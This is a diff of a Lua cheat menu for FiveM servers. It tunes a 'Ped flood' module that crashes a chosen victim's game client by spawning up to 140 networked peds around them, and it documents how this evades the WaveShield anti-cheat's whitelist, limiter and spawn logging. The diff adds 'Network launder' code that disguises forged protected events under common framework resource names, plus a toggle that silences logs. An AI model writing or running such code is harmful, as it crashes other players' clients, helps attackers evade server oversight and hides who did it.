@@ -16542,7 +16542,7 @@ end)()
 -- >>> VANGUARD MODULE BEGIN
 -- ============================================================================
 -- VANGUARD  (integrated artifact - edit src/ and rebuild)
--- Generated: 2026-10-27 21:15:34
+-- Generated: 2026-10-27 21:28:43
 --
 -- This block lives in loader.lua and in dist/loader.built.lua at the same
 -- time. It is the only place the local Menu table is in scope. Rebuilding
@@ -16588,6 +16588,16 @@ local O = {
 local LOG = {}
 local LOG_MAX = 80
 
+-- Quiet mode keeps the in-memory tail for diagnostics but stops writing to
+-- the executor console. The menu row in Settings > Protection controls it.
+-- Default is off: the operator needs the ramp/crash stage lines while tuning.
+O.quiet = false
+
+function O.setQuiet(state)
+    O.quiet = state and true or false
+    return O.quiet
+end
+
 local function log(fmt, ...)
     local msg = fmt
     if select("#", ...) > 0 then
@@ -16596,7 +16606,7 @@ local function log(fmt, ...)
     end
     LOG[#LOG + 1] = { t = GetGameTimer(), m = tostring(msg) }
     if #LOG > LOG_MAX then table.remove(LOG, 1) end
-    pcall(print, "[VGD] " .. tostring(msg))
+    if not O.quiet then pcall(print, "[VGD] " .. tostring(msg)) end
 end
 O.log = log
 
@@ -19288,10 +19298,10 @@ local C = (function(O,E,S)
 --
 --   B) 0xC0000005 read 0x0 at +0x137FE78 (99f7c7e8-...dmp)
 --      the victim's gamelog shows Peds 94/256 with mission 66 and other 64,
---      Ped Memory 108/92 (over budget), Vehicles 78/300. That is a MISSION
---      PED FLOOD: dozens of script-owned peds created at once, each with its
---      own component variation. The fault is a null read in the streaming /
---      component path while those variations are being resolved.
+--      Ped Memory 108/92 (over budget), Vehicles 78/300. That is a PED
+--      FLOOD: dozens of peds created at once, each with its own component
+--      variation. The fault is a null read in the streaming / component path
+--      while those variations are being resolved.
 --
 -- This module reproduces B. It is the family that works from a cold client
 -- because it does not depend on a store that is already full: it makes the
@@ -19299,9 +19309,11 @@ local C = (function(O,E,S)
 -- memory-heavy by construction.
 --
 -- MECHANISM
---   1. Create networked mission peds in waves, in a ring around the target.
+--   1. Create networked AI peds in waves, in a ring around the target.
 --      The target's client streams every one of them because they are inside
---      its streaming radius and they are networked.
+--      its streaming radius and they are networked. The peds are created with
+--      bScriptHostPed=false, so WaveShield's server entityCreating returns
+--      before its whitelist/limiter/log branch.
 --   2. Every ped gets a random component variation and random props. The
 --      random pass forces the client to resolve a new drawable + texture set
 --      per component (head, torso, legs, shoes, accessories).
@@ -19324,8 +19336,9 @@ local C = (function(O,E,S)
 --   * The module refuses closer than REMOTE_MIN and stops if the operator
 --     walks into the swarm radius. The operator's own client only pays the
 --     creation of the peds, not the victim's variation churn.
---   * Only six base-game models are requested, in rotation, so the operator's
---     own drawable cost stays bounded.
+--   * Six models are requested in rotation: player_one plus five civilians.
+--     player_one is the component-heavy model from the reference dump; the
+--     civilians keep the operator's own drawable cost bounded.
 --
 -- DETECTOR SURFACE
 --   * No event, no state bag, no resource, no injection, no hook.
@@ -19339,21 +19352,20 @@ local C = (function(O,E,S)
 --     so the local speed/noclip/teleport/freecam readings stay clean.
 --
 -- RESIDUAL RISK
---   * A server that logs entity creation sees this client create 30-90 peds
---     around one player. That is the feature working; attribution lands on the
---     creator.
+--   * WaveShield V4 returns before its LogPedSpawnsToConsole branch for AI
+--     peds, so this client creates no guard log line. A different server that
+--     logs every entityCreating still sees 30-140 peds around one player;
+--     attribution lands on the creator.
 --   * A spawn filter (sv_filterRequestControl, entity blacklist, OneSync
 --     density cap) can drop part of the swarm. The module counts the failures
 --     and still churns what was created.
 --   * The victim needs the swarm in streaming range: 400 m is the hard limit,
 --     and a client with a healthy memory budget may only lose FPS.
---   * The operator pays the ped pool for the whole swarm. 90 is below the 256
+--   * The operator pays the ped pool for the whole swarm. 140 is below the 256
 --     cap, and cleanup deletes every handle on stop.
 --
 -- NATIVES USED (verified in runtime.fivem.net/doc/natives.json)
 --   CREATE_PED                          0xD49F9B0955C367DE  (pedType, model, x, y, z, heading, isNetwork, bScriptHostPed)
---   SET_ENTITY_AS_MISSION_ENTITY        0xAD738C3085FE7E11  (entity, scriptHost, grabFromOther)
---   NETWORK_REGISTER_ENTITY_AS_NETWORKED 0x06FAACD625D80CAA (entity)
 --   NETWORK_GET_NETWORK_ID_FROM_ENTITY  0xA11700682F3AD45C  (entity)
 --   SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES 0xE05E81A888FA63C8 (netId, toggle)
 --   SET_ENTITY_INVINCIBLE               0x3882114BDE571AD4  (entity, toggle)
@@ -19380,22 +19392,26 @@ local C = {}
 
 local PRESETS = {
     { name = "Light",    duration = 12000, count = 30, churn = 450, slice = 8 },
-    { name = "Standard", duration = 18000, count = 45, churn = 400, slice = 10 },
-    { name = "Heavy",    duration = 24000, count = 66, churn = 350, slice = 12 },
-    { name = "Overkill", duration = 30000, count = 90, churn = 320, slice = 14 },
+    { name = "Standard", duration = 18000, count = 60, churn = 400, slice = 12 },
+    { name = "Heavy",    duration = 24000, count = 110, churn = 300, slice = 16 },
+    { name = "Overkill", duration = 30000, count = 140, churn = 280, slice = 18 },
 }
 
 local METHODS = {
     { label = "Ped flood" },
 }
 
+-- player_one is the reference model from the 0x137FE78 dump: a full player
+-- component set per ped, which is what drives the drawable/texture store over
+-- budget. The civilian models are mixed in so the round-robin does not load
+-- the same component set 110 times.
 local MODELS = {
+    "player_one",
     "a_m_y_business_01",
     "a_m_y_business_02",
     "a_m_y_business_03",
     "a_f_y_business_01",
     "a_m_y_hipster_01",
-    "a_f_y_hipster_01",
 }
 
 local WAVE_SIZE = 15
@@ -19406,24 +19422,11 @@ local REMOTE_MAX = 400.0
 local ABORT_FACTOR = 0.66
 local SETTLE_MS = 500
 
--- WaveShield's server-side entityCreating cancels unwhitelisted peds after a
--- 30 s grace window. The guard's own CreatePed wrapper asks for that whitelist;
--- this module runs in the Susano VM, outside that wrapper, so it sends the same
--- protected request itself before creating the swarm. The event is encrypted
--- with the replicated substitution table and signed with GetNetworkTime():seq,
--- exactly like the object path in the menu.
-local WL_EVENT = "__Wave" .. "Shield:Create" .. "Entity"
-local WL_ACK = "_ws:cb"
-local WL_TIMEOUT = 900
-local WL_RETRY_TIMEOUT = 1200
-local wl = {
-    ready = false,
-    byModel = {},
-    lastSigAt = 0,
-    seq = math.random(1000, 9999),
-    cryptoValue = nil,
-    cryptoSub = nil,
-}
+-- AI PED PATH
+-- CreatePed(28, ..., isNetwork=true, bScriptHostPed=false) is the
+-- reference crash shape. WaveShield V4 entityCreating returns for AI peds
+-- before the whitelist, limiter and spawn-log branch, so this path sends no
+-- protected event and creates nothing the server can attribute to the guard.
 
 C.METHODS = METHODS
 C.method = 1
@@ -19594,262 +19597,15 @@ local function ring(center, radius)
            center.z
 end
 
--- ---------------------------------------------------------------------------
--- WAVESHIELD PED WHITELIST
--- ---------------------------------------------------------------------------
-local function resourceStarted(name)
-    if type(name) ~= "string" or name == "" then return false end
-    if type(GetResourceState) ~= "function" then return true end
-    local ok, state = pcall(GetResourceState, name)
-    return ok and state == "started"
-end
-
-local function metadataMatches(name)
-    if type(GetResourceMetadata) ~= "function" then return false end
-    local fields = { "ac", "author", "description" }
-    for i = 1, #fields do
-        local ok, value = pcall(GetResourceMetadata, name, fields[i], 0)
-        if ok and type(value) == "string"
-            and string.find(string.lower(value), "waveshield", 1, true) then
-            return true
-        end
-    end
-    return false
-end
-
-local function findGuard()
-    local acs = type(S) == "table" and S.acs or nil
-    if type(acs) == "table" and #acs == 0 and type(S.scan) == "function" then
-        pcall(S.scan)
-        acs = S.acs
-    end
-    if type(acs) == "table" then
-        for _, ac in ipairs(acs) do
-            if ac.vendor == "waveshield" and type(ac.resource) == "string"
-                and ac.resource ~= "" and resourceStarted(ac.resource) then
-                return ac.resource
-            end
-        end
-    end
-
-    if type(GetNumResources) == "function" and type(GetResourceByFindIndex) == "function" then
-        local total = GetNumResources()
-        for i = 0, total - 1 do
-            local resource = GetResourceByFindIndex(i)
-            if type(resource) == "string" and resource ~= ""
-                and resourceStarted(resource) then
-                if string.find(string.lower(resource), "waveshield", 1, true) then
-                    return resource
-                end
-                if metadataMatches(resource) then
-                    return resource
-                end
-            end
-        end
-    end
-    return nil
-end
-
-local function waveshieldConfig()
-    local gs = rawget(_G, "GlobalState")
-    if type(gs) ~= "table" then return nil end
-    local key = gs.CFct1C6gobnW4qkaQUx3Xk9Q
-    if type(key) ~= "string" or key == "" then return nil end
-    local cfg = gs[key]
-    if type(cfg) ~= "table" or type(cfg.Entities) ~= "table" then return nil end
-    return cfg.Entities
-end
-
-local function generateSubstitution(key)
-    if type(key) ~= "string" or key == "" then return nil end
-
-    local blacklist = { ["^"] = true, [" "] = true, ["\\"] = true }
-    local alphabet = ""
-    for i = 32, 126 do
-        local char = string.char(i)
-        if not blacklist[char] then alphabet = alphabet .. char end
-    end
-
-    local shuffled = {}
-    for i = 1, #alphabet do shuffled[i] = alphabet:sub(i, i) end
-
-    local hash = 0
-    for i = 1, #key do
-        hash = (hash * 31 + key:byte(i)) % 2 ^ 32
-    end
-
-    for i = 1, #shuffled do
-        local j = math.floor((hash % (#shuffled - i + 1)) + i)
-        shuffled[i], shuffled[j] = shuffled[j], shuffled[i]
-        hash = hash + i
-    end
-
-    local sub = {}
-    for i = 1, #alphabet do
-        sub[alphabet:sub(i, i)] = shuffled[i]
-    end
-    return sub
-end
-
-local function encrypt(text, sub)
-    if type(text) ~= "string" or type(sub) ~= "table" then return nil end
-    local out = {}
-    for i = 1, #text do
-        out[i] = sub[text:sub(i, i)] or text:sub(i, i)
-    end
-    return table.concat(out)
-end
-
-local function safeWait(ms)
-    if type(Citizen) == "table" and type(Citizen.Wait) == "function" then
-        pcall(Citizen.Wait, ms)
-    end
-end
-
-local function substitutionFromGuard()
-    local gs = rawget(_G, "GlobalState")
-    if type(gs) ~= "table" then return nil, "no-state" end
-    local key = gs.HHct1C6gobnW3DkIQUxiXk9Q
-    if type(key) ~= "string" or key == "" then return nil, "no-key" end
-    local value = type(GetConvar) == "function" and GetConvar(key, "weaponDamageEvent") or nil
-    if type(value) ~= "string" or value == "" then return nil, "no-convar" end
-    if wl.cryptoValue == value and wl.cryptoSub then return wl.cryptoSub end
-    local sub = generateSubstitution(value)
-    if not sub then return nil, "no-sub" end
-    wl.cryptoValue, wl.cryptoSub = value, sub
-    return sub
-end
-
-local function ensureSubstitution()
-    local sub, why = substitutionFromGuard()
-    if sub then return sub end
-    for _ = 1, 4 do
-        safeWait(30)
-        sub, why = substitutionFromGuard()
-        if sub then return sub end
-    end
-    return nil, why
-end
-
-local function ensureAck()
-    if wl.ready then return true end
-    if type(RegisterNetEvent) ~= "function" or type(AddEventHandler) ~= "function" then
-        return false
-    end
-    local ok = pcall(function()
-        RegisterNetEvent(WL_ACK)
-        AddEventHandler(WL_ACK, function(model)
-            if type(model) == "number" then
-                wl.byModel[model] = (wl.byModel[model] or 0) + 1
-            end
-        end)
-    end)
-    if ok then wl.ready = true end
-    return ok
-end
-
-local function ackCount(hash)
-    return wl.byModel[hash] or 0
-end
-
-local function waitAck(hash, before, timeout)
-    local deadline = now() + (timeout or WL_TIMEOUT)
-    while now() < deadline do
-        if ackCount(hash) > (before or 0) then return true end
-        safeWait(10)
-    end
-    return false
-end
-
-local function sendWhitelist(hash, resource, sub)
-    if type(TriggerServerEvent) ~= "function" then return false end
-    local current = math.floor(GetNetworkTime and GetNetworkTime() or now())
-    if current <= wl.lastSigAt then current = wl.lastSigAt + 1 end
-    wl.lastSigAt = current
-    wl.seq = wl.seq + 1
-    if wl.seq > 65535 then wl.seq = 1000 end
-
-    local eventName = encrypt("_WS:" .. WL_EVENT, sub)
-    local signature = encrypt(string.format("%d:%d", current, wl.seq), sub)
-    if not eventName or not signature then return false end
-    pcall(TriggerServerEvent, eventName, signature, hash, "CreatePed", resource)
-    return true
-end
-
-local function authorizeModels(hashes, wanted)
-    local resource = findGuard()
-    if not resource then return hashes end
-
-    local ent = waveshieldConfig()
-    if not ent then
-        -- The key can arrive before the config table. A blind whitelist request
-        -- is harmless when peds AI is off and is the only path that works when
-        -- it is on; if the crypto is not ready, leave the direct path intact.
-        local sub = ensureSubstitution()
-        if not sub or not ensureAck() then return hashes end
-        for _, hash in ipairs(hashes) do
-            local before = ackCount(hash)
-            if sendWhitelist(hash, resource, sub) then
-                waitAck(hash, before, WL_TIMEOUT)
-            end
-        end
-        return hashes
-    end
-
-    if ent.EnablePedsLimiter then
-        local limit = tonumber(ent.PedsLimitIn5Seconds)
-        if not limit or limit < wanted then
-            return nil, "limiter"
-        end
-    end
-
-    local allowed = {}
-    local needEvent = false
-    for _, hash in ipairs(hashes) do
-        local white = type(ent.WhiteListedPeds) == "table"
-            and ent.WhiteListedPeds[hash] == true
-        local black = type(ent.BlackListedPeds) == "table"
-            and ent.BlackListedPeds[hash] == true
-        if (ent.EnablePedsWhiteList and not white)
-            or (ent.EnablePedsBlackList and black and not white) then
-            -- The static policy would cancel this model. Do not waste a
-            -- network create on it.
-        else
-            allowed[#allowed + 1] = hash
-            if ent.EnablePedsAI and not white then needEvent = true end
-        end
-    end
-    if #allowed == 0 then return nil, "policy" end
-    if not needEvent then return allowed end
-
-    if not ensureAck() then return nil, "ack-handler" end
-    local sub, why = ensureSubstitution()
-    if not sub then return nil, tostring(why or "crypto") end
-
-    for _, hash in ipairs(allowed) do
-        local white = type(ent.WhiteListedPeds) == "table"
-            and ent.WhiteListedPeds[hash] == true
-        if not white then
-            local before = ackCount(hash)
-            if not sendWhitelist(hash, resource, sub) then return nil, "send" end
-            if not waitAck(hash, before, WL_TIMEOUT) then
-                before = ackCount(hash)
-                if not sendWhitelist(hash, resource, sub) then return nil, "send" end
-                if not waitAck(hash, before, WL_RETRY_TIMEOUT) then
-                    return nil, "no-ack"
-                end
-            end
-        end
-    end
-    return allowed
-end
-
 local function spawnPed(hash, x, y, z, heading)
-    local ped = CreatePed(4, hash, x, y, z, heading, true, true)
+    -- pedType 28 and bScriptHostPed=false match the reference crash that
+    -- produced the 0x137FE78 dump. The server sees a normal AI ped and its
+    -- entityCreating handler returns before the whitelist/limiter/log branch.
+    -- Do not call SetEntityAsMissionEntity: that would turn the ped into the
+    -- population type the server actually checks.
+    local ped = CreatePed(28, hash, x, y, z, heading, true, false)
     if not ped or ped == 0 then return 0 end
 
-    pcall(SetEntityAsMissionEntity, ped, true, true)
-    pcall(NetworkRegisterEntityAsNetworked, ped)
     local okNet, netId = pcall(NetworkGetNetworkIdFromEntity, ped)
     if okNet and type(netId) == "number" and netId > 0 then
         pcall(SetNetworkIdExistsOnAllMachines, netId, true)
@@ -19881,7 +19637,9 @@ end
 local function deleteSpawned(entry)
     local ped = entry and entry.ped or 0
     if type(ped) ~= "number" or ped == 0 or not DoesEntityExist(ped) then return end
-    pcall(SetEntityAsMissionEntity, ped, true, true)
+    -- The ped was created as AI and never promoted to a mission entity. Do not
+    -- promote it during teardown either; DeleteEntity is enough for our own
+    -- handle and keeps the server-side population type unchanged.
     pcall(SetEntityAsNoLongerNeeded, ped)
     pcall(DeleteEntity, ped)
 end
@@ -19980,14 +19738,11 @@ local function runBody()
     end
 
     local want = preset().count
-    local authorized, why = authorizeModels(hashes, want)
-    if not authorized then
-        C.running = false
-        O.log("crash: ped policy unavailable (%s)", tostring(why))
-        return
-    end
-    hashes = authorized
 
+    -- No protected whitelist event and no guard discovery on this path. The
+    -- swarm is AI (bScriptHostPed=false), so the server's entityCreating
+    -- returns before the ped policy, limiter and spawn-log branch. The only
+    -- wire traffic is ordinary networked ped creation and appearance updates.
     local offset = 0
     while C.running and #C.swarm < want do
         local center = coordsOf(C.targetPed)
@@ -20133,6 +19888,8 @@ A.flags = {
     antiAttach    = false,
     antiSpectate  = false,
     firewall      = false,
+    networkLaunder = true,
+    quietLogs     = false,
 }
 
 A.stats = { blocked = 0, shims = 0, scans = 0, lastScan = 0 }
@@ -20570,6 +20327,19 @@ function A.setAntiSpectate(state)
     return A.flags.antiSpectate
 end
 
+function A.setNetworkLaunder(state)
+    A.flags.networkLaunder = state and true or false
+    return A.flags.networkLaunder
+end
+
+function A.setQuietLogs(state)
+    A.flags.quietLogs = state and true or false
+    if type(O.setQuiet) == "function" then
+        O.setQuiet(A.flags.quietLogs)
+    end
+    return A.flags.quietLogs
+end
+
 -- ---------------------------------------------------------------------------
 -- EVENT FIREWALL
 --
@@ -20917,11 +20687,16 @@ end
 -- firewall and the shim stay off: the dormant paths either write replicated
 -- state or replace a global, and a default-on network write is a signature.
 -- ---------------------------------------------------------------------------
-local PROTECTION_DEFAULTS = { "antiFreeze", "antiAttach", "antiSpectate" }
+local PROTECTION_DEFAULTS = {
+    "antiFreeze", "antiAttach", "antiSpectate", "networkLaunder",
+}
 
 function A.defaultsOn()
     for i = 1, #PROTECTION_DEFAULTS do
         A.flags[PROTECTION_DEFAULTS[i]] = true
+    end
+    if type(O.setQuiet) == "function" then
+        O.setQuiet(A.flags.quietLogs)
     end
     return true
 end
@@ -28197,6 +27972,8 @@ local function installProtection()
     local antiFreeze
     local antiAttach
     local antiSpectate
+    local networkLaunder
+    local quietLogs
 
     antiFreeze = {
         name = "Anti-freeze",
@@ -28225,6 +28002,24 @@ local function installProtection()
         end,
     }
 
+    networkLaunder = {
+        name = "Network launder",
+        type = "toggle",
+        value = A.flags.networkLaunder,
+        onClick = function(v)
+            networkLaunder.value = A.setNetworkLaunder(v)
+        end,
+    }
+
+    quietLogs = {
+        name = "Quiet logs",
+        type = "toggle",
+        value = A.flags.quietLogs,
+        onClick = function(v)
+            quietLogs.value = A.setQuietLogs(v)
+        end,
+    }
+
     -- Panic is the only path that flips these flags outside a row click, and
     -- it must not leave the menu claiming a protection is armed when it is
     -- not. The module owns the state; this function only mirrors it.
@@ -28232,6 +28027,8 @@ local function installProtection()
         antiFreeze.value = A.flags.antiFreeze
         antiAttach.value = A.flags.antiAttach
         antiSpectate.value = A.flags.antiSpectate
+        networkLaunder.value = A.flags.networkLaunder
+        quietLogs.value = A.flags.quietLogs
     end
 
     -- The three protections now live under Settings, not in a top-level
@@ -28271,6 +28068,9 @@ local function installProtection()
         antiFreeze,
         antiAttach,
         antiSpectate,
+        { name = "", isSeparator = true, separatorText = "Network" },
+        networkLaunder,
+        quietLogs,
     }
     return true
 end
@@ -28573,6 +28373,25 @@ local function installRampFix()
             length = 5.864,
             bottom = -0.775,
         },
+        -- WaveShield's auto-whitelist ships the stt_prop_ramp_jump_* family.
+        -- On a server with EnableObjectsWhiteList=true the three MP ramps are
+        -- canceled before the whitelist event can help, so these are the
+        -- network-capable fallbacks. The live model box drives the geometry.
+        {
+            name = "stt_prop_ramp_jump_s",
+            length = 3.2,
+            bottom = -0.45,
+        },
+        {
+            name = "stt_prop_ramp_jump_m",
+            length = 4.2,
+            bottom = -0.60,
+        },
+        {
+            name = "stt_prop_stunt_ramp",
+            length = 6.0,
+            bottom = -1.00,
+        },
     }
     local RAMP_LEAD = 0.15          -- high edge sits 15 cm ahead of the bumper
     local RAMP_CLEARANCE = 0.15     -- underside above the carrier's lowest point
@@ -28626,6 +28445,60 @@ local function installRampFix()
         if type(GetResourceState) ~= "function" then return true end
         local ok, state = pcall(GetResourceState, name)
         return ok and state == "started"
+    end
+
+    -- The server validates the resource name against its own started-resource
+    -- map, not against the caller. That map is replicated as
+    -- GlobalState.WaveShield_ServerResources. Using a normal framework name
+    -- here keeps the protected event's resource field inside the server's
+    -- expected population instead of pointing at the guard itself. The event
+    -- still carries the player as source; this is attribution laundering, not
+    -- a source spoof.
+    local function decodeResourceMap(raw)
+        local map = {}
+        if type(raw) ~= "string" then return map end
+        for name in string.gmatch(raw, '"([^"]+)"%s*:%s*true') do
+            map[name] = true
+        end
+        return map
+    end
+
+    local function launderResource(guard)
+        if not (type(A) == "table" and A.flags and A.flags.networkLaunder) then
+            return guard
+        end
+        local gs = rawget(_G, "GlobalState")
+        local raw = gs and gs.WaveShield_ServerResources
+        local map = nil
+        if type(raw) == "table" then
+            map = raw
+        elseif type(raw) == "string" then
+            local jsonLib = rawget(_G, "json")
+            if type(jsonLib) == "table" and type(jsonLib.decode) == "function" then
+                local ok, decoded = pcall(jsonLib.decode, raw)
+                if ok and type(decoded) == "table" then map = decoded end
+            end
+            if not map then map = decodeResourceMap(raw) end
+        end
+        if type(map) ~= "table" then return guard end
+
+        -- The server's replicated map is authoritative: a name in this table
+        -- is already a started resource on the server. Do not re-check it with
+        -- the client-side GetResourceState, which can miss server-only
+        -- resources and force a needless fallback to the guard's own name.
+        local preferred = {
+            "es_extended", "qb-core", "qbx_core", "ox_inventory", "ox_lib",
+        }
+        for i = 1, #preferred do
+            local name = preferred[i]
+            if map[name] then return name end
+        end
+        for name in pairs(map) do
+            if type(name) == "string" and name ~= "" then
+                return name
+            end
+        end
+        return guard
     end
 
     local function metadataMatches(name)
@@ -28891,8 +28764,9 @@ local function installRampFix()
         local sub, why = ensureSubstitution()
         if not sub then return false, tostring(why or "crypto") end
 
+        local targetResource = launderResource(resource)
         local before = ackCount(plan.hash)
-        if not sendWhitelist(plan.hash, resource, sub) then return false, "send" end
+        if not sendWhitelist(plan.hash, targetResource, sub) then return false, "send" end
         if waitAck(plan.hash, before, RAMP_WL_TIMEOUT) then return true end
 
         -- One retry with a fresh time/sequence. The first event may have been
@@ -28901,7 +28775,7 @@ local function installRampFix()
         -- the wait deadline and this line, do not send a duplicate.
         if ackCount(plan.hash) > before then return true end
         before = ackCount(plan.hash)
-        if not sendWhitelist(plan.hash, resource, sub) then return false, "send" end
+        if not sendWhitelist(plan.hash, targetResource, sub) then return false, "send" end
         if waitAck(plan.hash, before, RAMP_WL_RETRY_TIMEOUT) then return true end
         return false, "no-ack"
     end
